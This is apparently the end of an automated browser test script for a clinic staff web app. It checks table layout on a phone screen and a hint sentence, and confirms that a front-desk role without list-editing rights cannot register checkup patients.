    const w = wrap.getBoundingClientRect();
    const cell = document.querySelector('table.checkup-table tbody tr[data-id] th.checkup-who').getBoundingClientRect();
    const head = document.querySelector('table.checkup-table thead th.checkup-who').getBoundingClientRect();
    return { scrolled: wrap.scrollLeft, cellLeft: cell.left - w.left, headLeft: head.left - w.left, cellRight: cell.right - w.left, wide: w.width };
  });
  assert.ok(pinned.scrolled > 200, 'the table scrolled sideways: ' + JSON.stringify(pinned));
  assert.ok(Math.abs(pinned.cellLeft) <= 2 && Math.abs(pinned.headLeft) <= 2, 'the name cell and its heading stay at the left edge: ' + JSON.stringify(pinned));
  assert.ok(pinned.cellRight < pinned.wide, 'and leave room for the other columns: ' + JSON.stringify(pinned));
  await noSideScroll(pp);
  // Register and Edit sit side by side, so a row is not taller than it needs to be
  const sides = await pp.evaluate(() => {
    const tr = document.querySelector('table.checkup-table tbody tr[data-id]');
    const buttons = [...tr.querySelectorAll('.row-actions button')].map((b) => b.getBoundingClientRect());
    return { n: buttons.length, sameLine: buttons.every((b) => Math.abs(b.top - buttons[0].top) < 2) };
  });
  assert.ok(sides.n >= 1 && sides.sameLine, 'the row buttons are on one line');
});

await step('phone: the Checkups page has a row on the first screen (More filters is closed), and the Aaj ki List add panel says it in one short sentence pair', async () => {
  await pp.goto(BASE + '#/staff/checkups');
  await pp.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pp.locator('details.checkup-more').evaluate((el) => el.open), false);
  const top = await pp.locator('table.checkup-table tbody tr[data-id]').first().evaluate((el) => el.getBoundingClientRect().top);
  assert.ok(top < 700, 'the first row starts at ' + Math.round(top) + 'px of an 812px screen');
  await pp.goto(BASE + '#/staff/sheet');
  await pp.waitForSelector('.add-panel:not([hidden])');
  const hint = (await pp.locator('.add-panel-text .muted').innerText()).trim();
  assert.equal(hint, 'New and starting treatment? Use "+ New walk-in" (gets an Mr#). Only a checkup? Use "+ Checkup patient" (no Mr#).');
});
// ------------------------------------------------------------- Register needs both "Register new patients" and list editing
await step('Register needs both "Register new patients" and list editing: with list editing off for a person the button is not offered, and the data layer says no', async () => {
  // (the accountant's page: its own in-memory demo data, not used again after this)
  await pa.getByRole('button', { name: 'Try another role' }).click();
  await pa.waitForSelector('.topbar', { state: 'detached' });
  await loginAs(pa, 'Dr. Ali Rashid');
  await pa.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-fd-nn', 'sheet.edit', false); });
  await pa.getByRole('button', { name: 'Try another role' }).click();
  await pa.waitForSelector('.topbar', { state: 'detached' });
  await loginAs(pa, 'Front desk.*North Nazimabad');
  const rights = await pa.evaluate(async () => { const { can } = await import('/js/state.js'); return [can('patients.create'), can('sheet.edit'), can('sheet.view')]; });
  assert.deepEqual(rights, [true, false, true], 'may register patients and see the list, but not edit it');
  await pa.goto(BASE + '#/staff/checkups');
  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pa.locator('table.checkup-table').getByRole('button', { name: /^Register / }).count(), 0, 'no Register button on the Checkups page');
  await pa.goto(BASE + '#/staff/sheet');
  await pa.waitForSelector('table.sheet tbody tr.is-checkup');
  await pa.locator('table.sheet tbody tr.is-checkup').first().getByRole('button', { name: /Checkup options/ }).click();
  await pa.locator('.modal').waitFor();
  assert.equal(await pa.locator('.modal').getByRole('button', { name: 'Register as patient' }).count(), 0, 'and none in the options of a checkup row');
  await pa.keyboard.press('Escape');
  const answer = await pa.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    const rows = await state.data.listDayCheckups({ branchId: 2, date: localISO() });
    try { await state.data.registerCheckupAsPatient(rows[0].id); return 'registered'; } catch (e) { return e.message; }
  });
  assert.match(answer, /NOT_ALLOWED: registering a patient needs "Register new patients" and "Add and edit Aaj ki List entries"/);
});

await browser.close();
if (errors.length) { console.log('Browser errors:\n  ' + [...new Set(errors)].join('\n  ')); process.exitCode = 1; }
console.log(`${passed} checks passed`);
